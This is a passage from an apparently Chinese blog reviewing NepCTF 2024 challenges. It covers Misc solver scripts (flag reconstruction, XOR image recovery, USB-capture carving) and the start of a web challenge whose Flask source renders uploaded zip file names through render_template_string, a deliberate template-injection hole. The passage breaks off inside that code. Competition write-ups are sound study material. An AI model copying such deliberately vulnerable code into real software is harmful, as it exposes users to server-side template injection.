class="hljs-code">    image: postgres:alpine</span><br><span class="hljs-code">    restart: always</span><br><span class="hljs-code">environment:</span><br><span class="hljs-code">      - &quot;POSTGRES_PASSWORD=XXXXX&quot;</span><br><span class="hljs-code">    ports:</span><br><span class="hljs-code">      - &quot;5432:5432&quot;</span><br><span class="hljs-code">    volumes:</span><br><span class="hljs-code">      - &quot;./data/db:/var/lib/postgresql/data&quot;</span><br></code></pre></td></tr></table></figure><p>然后可以在本地进行连接(注意安全问题！！！)</p><ul><li>修改数据库密码记得两个文件同时修改</li></ul>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nepctf2024复盘</title>
    <link href="/2024/08/28/nepctf/nepctf2024/"/>
    <url>/2024/08/28/nepctf/nepctf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Nemophila"><a href="#Nemophila" class="headerlink" title="Nemophila"></a>Nemophila</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提示：宝箱怪只会提示你口令正确与否，请你试试吧！&quot;</span>)<br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Turn in your guess: &#x27;</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) !=<span class="hljs-number">48</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;长度不对！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(flag.capitalize()[<span class="hljs-number">0</span>]) != <span class="hljs-number">83</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> flag[<span class="hljs-number">0</span>].islower():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[-<span class="hljs-number">3</span>:] != <span class="hljs-string">&quot;ve&#125;&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> flag.count(<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)) != <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> base64.b64encode((flag[<span class="hljs-number">10</span>:<span class="hljs-number">13</span>]+flag[<span class="hljs-number">28</span>:<span class="hljs-number">31</span>]).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode() != <span class="hljs-string">&#x27;RnJpSGlt&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]) &gt; <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]) &lt; <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]),<span class="hljs-number">2</span>,<span class="hljs-number">5</span>) != <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像有点不对！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>number = flag[<span class="hljs-number">33</span>] + flag[<span class="hljs-number">41</span>] + flag[<span class="hljs-number">43</span>:<span class="hljs-number">45</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(number) * <span class="hljs-number">9_27</span> != <span class="hljs-number">1028970</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> number.isnumeric():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;还是不对呢！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">35</span>:<span class="hljs-number">41</span>].replace(<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) != <span class="hljs-string">&quot;1t1rna&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">31</span>:<span class="hljs-number">33</span>].swapcase() != <span class="hljs-string">&quot;ME&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这不是我!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">len</span>,flag.split(<span class="hljs-string">&quot;_&quot;</span>))) != [<span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>] <span class="hljs-keyword">and</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">len</span>,flag.split(<span class="hljs-string">&quot;&amp;&quot;</span>))) != [<span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">20</span>]:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;换个顺序！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">min</span>(flag[:<span class="hljs-number">2</span>].swapcase())) != <span class="hljs-number">69</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">2</span>] + flag[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] != <span class="hljs-string">&quot;cet4&quot;</span>[:<span class="hljs-number">3</span>]:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我不想考四级！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>new=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] + flag[<span class="hljs-number">18</span>] + flag[<span class="hljs-number">26</span>]: new += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> new != <span class="hljs-string">&quot;jt|Df&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;SunR&quot;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;eren&quot;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像对了！可以先去试试！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！&quot;</span>)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># 补全</span><br>flag = <span class="hljs-string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><br><span class="hljs-comment"># 将字符串转换为列表</span><br>flag_list = <span class="hljs-built_in">list</span>(flag)<br>flag_list[<span class="hljs-number">0</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">83</span>).lower()<br><br>flag_list[-<span class="hljs-number">3</span>:] = <span class="hljs-string">&quot;ve&#125;&quot;</span><br><span class="hljs-comment"># base64解密带入</span><br>base64_code = <span class="hljs-built_in">list</span>(base64.b64decode(<span class="hljs-string">&quot;RnJpSGlt&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>flag_list[<span class="hljs-number">10</span>:<span class="hljs-number">13</span>] = base64_code[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>flag_list[<span class="hljs-number">28</span>:<span class="hljs-number">31</span>] = base64_code[<span class="hljs-number">3</span>:]<br><span class="hljs-comment"># 简单数学计算答案15</span><br>flag_list[<span class="hljs-number">24</span>] = <span class="hljs-string">&quot;1&quot;</span><br>flag_list[<span class="hljs-number">25</span>] = <span class="hljs-string">&quot;5&quot;</span><br><span class="hljs-comment"># 计算带入</span><br>number = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-number">1028970</span>/<span class="hljs-number">927</span>))<br>flag_list[<span class="hljs-number">33</span>] = number[<span class="hljs-number">0</span>]<br>flag_list[<span class="hljs-number">41</span>] = number[<span class="hljs-number">1</span>]<br>flag_list[<span class="hljs-number">43</span>:<span class="hljs-number">45</span>] = number[<span class="hljs-number">2</span>:]<br><br>str1 = <span class="hljs-string">&quot;1t1rna&quot;</span>.replace(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>)<br>flag_list[<span class="hljs-number">35</span>:<span class="hljs-number">41</span>] = str1<br><span class="hljs-comment"># 转化大小写</span><br>flag_list[<span class="hljs-number">31</span>:<span class="hljs-number">33</span>] = <span class="hljs-string">&quot;me&quot;</span><br><span class="hljs-comment"># 进行分割</span><br>flag_list[<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">19</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">34</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">42</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;&amp;&quot;</span><br>flag_list[<span class="hljs-number">27</span>] = <span class="hljs-string">&quot;&amp;&quot;</span><br><br>flag_list[<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).lower()<br><br>flag_list[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;cet4&quot;</span>[<span class="hljs-number">0</span>]<br>flag_list[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;cet4&quot;</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]<br><br>flag_list[<span class="hljs-number">7</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;j&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">8</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;t&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">9</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;|&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">18</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;D&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">26</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>) - <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 前面的是芙莉莲后面的是辛美尔</span><br>flag_list[<span class="hljs-number">13</span>:<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;eren&quot;</span><br>flag_list[<span class="hljs-number">20</span>:<span class="hljs-number">24</span>] = <span class="hljs-string">&quot;SunR&quot;</span><br><span class="hljs-comment"># 猜测是单词secret</span><br>flag_list[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;r&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(flag_list)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>得到**secret_is{Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve}**解压得到图片，010分析之后可能需要异或得到原来的图片(第一次见,涨知识了)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;miaomiao.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>key = <span class="hljs-string">b&#x27;secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;&#x27;</span><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    data = enc[i]^key[i%<span class="hljs-built_in">len</span>(key)]<br>    flag.append(data)<br><br>flag = <span class="hljs-built_in">bytes</span>(flag)<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(flag)<br></code></pre></td></tr></table></figure><p>没有直接的flag，crc爆破一下得到flag</p><p><img src="/../../images/nepctf/2024/flag.png" alt="flag"></p><h2 id="NepMagic-——-CheckIn"><a href="#NepMagic-——-CheckIn" class="headerlink" title="NepMagic —— CheckIn"></a>NepMagic —— CheckIn</h2><p>游戏签到，有一层需要盲走得到隐藏的碎片，走完就可以得到flag了</p><p><img src="/../../images/nepctf/2024/checkin.png" alt="checkin"></p><h2 id="3DNep"><a href="#3DNep" class="headerlink" title="3DNep"></a>3DNep</h2><p>也是第一次见，010打开开头是gitf，搜索一下是3d模型的图片，改一下.gitf，用该网站看一下<a href="https://gltf-viewer.donmccurdy.com/">在线网址</a></p><img src="/../../images/nepctf/2024/hanxin.png" alt="hanxin" style="zoom:67%;"><p>可以得到图片，遇到的二维码是汉信码也是第一次见，用在线网站扫一下，得到flag</p><p>NepCTF{6e766b59-23d1-395c26d708a4}</p><h2 id="NepCamera"><a href="#NepCamera" class="headerlink" title="NepCamera"></a>NepCamera</h2><p>跟着官方wp也是学一遍，也是第一次见usb类型的流量包，根据官p和晨曦师傅的wp研究了一下，先看一下usb里面的流量包里面会发现有<code>ffd8ffe0</code>的内容，利用tshark先把内容提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r NepCamera.pcapng -T fields -e usb.iso.data &gt; <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>然后就是写脚本提取内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">datas = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../test&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read().strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>hex_data = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:<br>    data = i.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    hex_data += <span class="hljs-string">&#x27;&#x27;</span>.join([d[<span class="hljs-number">24</span>:] <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(hex_data))<br>cnt = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    start = hex_data.find(<span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>)<br>    <span class="hljs-keyword">if</span> start == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    end = hex_data[start+<span class="hljs-number">8</span>:].find(<span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>)<br>    <span class="hljs-keyword">if</span> end == -<span class="hljs-number">1</span>:<br>        end = <span class="hljs-built_in">len</span>(hex_data)<br>    out_data = hex_data[start:end]<br>    hex_data = hex_data[end:]<br>    out_data = <span class="hljs-built_in">bytes</span>.fromhex(out_data)<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./img/&#x27;</span>+<span class="hljs-built_in">str</span>(cnt)+<span class="hljs-string">&#x27;.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(out_data)<br>    cnt += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(cnt)<br></code></pre></td></tr></table></figure><p>对图片进行分析一会就可以得到flag了</p><h1 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h1><p>进行binwalk一下得到许多文件</p><p>再进行string 分析通过排除可以得到在string 19047F里面有</p><p>猜一手base64然后就可以搜<code>=</code>有一串长的内容，利用cyber厨子得到flag</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">JZSXAQ2UIZ5VSMDVL5DTA5C7JMZTG3S7GFXFGMLHNB2F6MLOL53FQ5ZQOJFXGIJBEFPUYM3UE5ZV6RZQL5DHK4TUNAZXE7I=<br></code></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t’s_G0_Furth3r}</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h2><p>这题其实已经有思路了，就是利用上传文件进行ssti，但是自己代码没有好好看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> zipfile <span class="hljs-keyword">import</span> ZipFile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader<br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;static&#x27;</span>)<br>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;/app/uploads&#x27;</span><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(UPLOAD_FOLDER):<br>    os.makedirs(UPLOAD_FOLDER)<br><br>template_env = Environment(loader=FileSystemLoader(<span class="hljs-string">&#x27;static&#x27;</span>), autoescape=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-params">template_name, **context</span>):<br>    template = template_env.get_template(template_name)<br>    <span class="hljs-keyword">return</span> template.render(**context)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template_string</span>(<span class="hljs-params">template_string, **context</span>):<br>    template = template_env.from_string(template_string)<br>    <span class="hljs-keyword">return</span> template.render(**context)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Please use POST method to upload files.&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        clear_uploads_folder()<br>        files = request.files.get(<span class="hljs-string">&#x27;tp_file&#x27;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> files:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span><br><br>        file_size = <span class="hljs-built_in">len</span>(files.read())<br>        files.seek(<span class="hljs-number">0</span>)<br><br>        file_extension = files.filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].lower()<br>        <span class="hljs-keyword">if</span> file_extension != <span class="hljs-string">&#x27;zip&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span><br><br>        timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d%H%M%S&#x27;</span>)<br>        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()<br>        unzip_folder = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)<br>        os.makedirs(unzip_folder, exist_ok=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">with</span> ZipFile(files) <span class="hljs-keyword">as</span> zip_file:<br>            zip_file.extractall(path=unzip_folder)<br><br>        files_list = []<br>        <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):<br>            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>                <span class="hljs-built_in">print</span>(file)<br>                file_path = os.path.join(root, file)<br>                relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])<br>                link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span><br>                files_list.append(link)<br><br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))<br><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid filename.&#x27;</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;An error occurred. Please check your file and try again.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/cat&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    file_path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File path is missing.&#x27;</span><br><br>    new_file = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)<br>    <span class="hljs-keyword">if</span> os.path.commonprefix(<br>            [os.path.abspath(new_file), 